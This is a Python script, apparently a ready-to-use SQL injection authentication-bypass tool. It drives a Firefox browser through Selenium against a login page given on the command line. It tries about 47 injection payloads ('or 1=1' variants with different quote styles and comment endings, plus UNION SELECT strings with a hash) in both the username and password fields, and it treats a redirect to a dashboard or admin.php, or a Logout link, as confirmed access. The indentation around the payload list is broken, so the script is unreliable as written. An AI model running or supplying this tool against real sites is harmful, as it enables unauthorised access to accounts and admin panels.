import argparse
from selenium import webdriver
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException, NoSuchElementException, ElementClickInterceptedException, UnexpectedAlertPresentException, NoAlertPresentException
)
from termcolor import colored
import logging
import time

logging.getLogger('selenium').setLevel(logging.WARNING)

driver_path = '/usr/local/bin/geckodriver'
service = Service(driver_path)

def bypass_auth(url, payloads):
    driver = webdriver.Firefox(service=service)
    
    try:
        driver.get(url)
        print(colored("[*] Page loaded successfully at " + url, 'blue'))

        for payload in payloads:
            try:
                input_fields = WebDriverWait(driver, 10).until(
                    EC.presence_of_all_elements_located((By.TAG_NAME, "input"))
                )

                username_field = None
                password_field = None

                for field in input_fields:
                    if field.get_attribute("type") == "text" and username_field is None:
                        username_field = field
                    elif field.get_attribute("type") == "password" and password_field is None:
                        password_field = field

                if not username_field or not password_field:
                    print(colored("[!] Username or password field not found.", 'red'))
                    break

                username_field.clear()
                username_field.send_keys(payload)
                password_field.clear()
                password_field.send_keys(payload)
                print(colored("[*] Trying payload: " + payload, 'yellow'))

                try:
                    submit_button = None
                    for field in input_fields:
                        if field.get_attribute("type") == "submit" or field.get_attribute("type") == "button":
                            submit_button = field
                            break

                    if not submit_button:
                        submit_button = WebDriverWait(driver, 10).until(
                            EC.element_to_be_clickable((By.XPATH, "//button"))
                        )
                    
                    driver.execute_script("arguments[0].scrollIntoView(true);", submit_button)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", submit_button)
                    print(colored("[*] Clicked on the login button using JavaScript.", 'green'))

                except (NoSuchElementException, TimeoutException, ElementClickInterceptedException) as e:
                    print(colored(f"[!] Error locating or clicking the login button: {e}", 'red'))
                    continue

                try:
                    alert = driver.switch_to.alert
                    alert.dismiss()
                    print(colored(f"[!] Dismissed an unexpected alert during payload: {payload}", 'yellow'))
                except NoAlertPresentException:
                    pass

                try:
                    WebDriverWait(driver, 10).until(
                        lambda d: "dashboard" in d.current_url or "admin.php" in d.current_url
                    )
                    print(colored("[*] Redirected to a potential dashboard page with payload.", 'green'))

                    try:
                        logout_button = WebDriverWait(driver, 5).until(
                            EC.presence_of_element_located((By.XPATH, "//a[contains(., 'Logout')] | //button[contains(., 'Logout')]"))
                        )
                        print(colored("[*] Logout option detected. Access confirmed.", 'green'))
                        break

                    except TimeoutException:
                        print(colored("[!] Logout option not found. May not be successfully logged in.", 'yellow'))

                except TimeoutException:
                    print(colored("[!] Redirection to dashboard or admin page failed. Trying next payload.", 'yellow'))

            except UnexpectedAlertPresentException:
                print(colored(f"[!] Unexpected alert handled and dismissed for payload: {payload}", 'yellow'))
                continue

            except Exception as e:
                print(colored(f"[!] Exception occurred while processing payload {payload}: {e}", 'red'))
                continue

    except Exception as e:
        print(colored(f"[!] An error occurred: {e}", 'red'))

    print(colored("[*] Browser will remain open for inspection.", 'blue'))

def main():
    banner = colored("""    
   _____          __  .__   __________                                    
  /  _  \  __ ___/  |_|  |__\______   \___.__.___________    ______ ______
 /  /_\  \|  |  \   __\  |  \|    |  _<   |  |\____ \__  \  /  ___//  ___/
/    |    \  |  /|  | |   Y  \    |   \\___  ||  |_> > __ \_\___ \ \___ \ 
\____|__  /____/ |__| |___|  /______  // ____||   __(____  /____  >____  >
        \/                 \/       \/ \/     |__|       \/     \/     \/ 

    Author: 0xgh057r3con
    Version: 1.0
""", 'magenta')
    print(banner)

    parser = argparse.ArgumentParser(description="SQL Injection Authentication Bypass")
    parser.add_argument("-u", "--url", required=True, help="Target URL of the admin panel")

    args = parser.parse_args()
    url = args.url

payloads = [
    "or 1=1",
    "or 1=1--",
    "or 1=1#",
    "or 1=1/*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "admin'or 1=1 or ''='",
    "admin' or 1=1",
    "admin' or 1=1--",
    "admin' or 1=1#",
    "admin' or 1=1/*",
    "admin') or ('1'='1",
    "admin') or ('1'='1'--",
    "admin') or ('1'='1'#",
    "admin') or ('1'='1'/*",
    "admin') or '1'='1",
    "admin') or '1'='1'--",
    "admin') or '1'='1'#",
    "admin') or '1'='1'/*",
    "admin\" --",
    "admin\" #",
    "admin\"/*",
    "admin\" or \"1\"=\"1",
    "admin\" or \"1\"=\"1\"--",
    "admin\" or \"1\"=\"1\"#",
    "admin\" or \"1\"=\"1\"/*",
    "admin\"or 1=1 or \"\"=\"",
    "admin\" or 1=1",
    "admin\" or 1=1--",
    "admin\" or 1=1#",
    "admin\" or 1=1/*",
    "admin\") or (\"1\"=\"1",
    "admin\") or (\"1\"=\"1\"--",
    "admin\") or (\"1\"=\"1\"#",
    "admin\") or (\"1\"=\"1\"/*",
    "admin\") or \"1\"=\"1",
    "admin\") or \"1\"=\"1\"--",
    "admin\") or \"1\"=\"1\"#",
    "admin\") or \"1\"=\"1\"/*",
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
    "'or 1=1 limit 1-- -",
]

    print(colored("[*] Attempting authentication bypass on " + url, 'blue'))
    bypass_auth(url, payloads)

if __name__ == "__main__":
    main()
